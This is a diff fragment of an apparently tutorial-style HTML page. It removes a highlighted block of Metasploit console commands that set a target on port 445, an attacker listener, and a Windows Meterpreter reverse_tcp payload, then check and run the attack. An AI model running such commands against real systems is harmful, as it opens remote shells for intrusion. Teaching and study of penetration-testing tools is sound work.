@@ -1,12 +1,3 @@
-                               <span class="c"># List required options</span>
-<span class="cmd">set</span> <span class="kw">RHOSTS</span>  <span class="val">192.168.1.10</span>                          <span class="c"># Target IP</span>
-<span class="cmd">set</span> <span class="kw">RPORT</span>   <span class="val">445</span>                                    <span class="c"># Target port</span>
-<span class="cmd">set</span> <span class="kw">LHOST</span>   <span class="val">192.168.1.5</span>                            <span class="c"># Your listener IP</span>
-<span class="cmd">set</span> <span class="kw">LPORT</span>   <span class="val">4444</span>                                   <span class="c"># Listener port</span>
-<span class="cmd">set</span> <span class="kw">PAYLOAD</span> <span class="val">windows/x64/meterpreter/reverse_tcp</span>   <span class="c"># Payload</span>
-<span class="cmd">check</span>                                               <span class="c"># Verify vulnerability</span>
-<span class="cmd">run</span>                                                 <span class="c"># Fire!</span></pre>
-    </div>
 
     <div class="code-block">
       <div class="code-header">
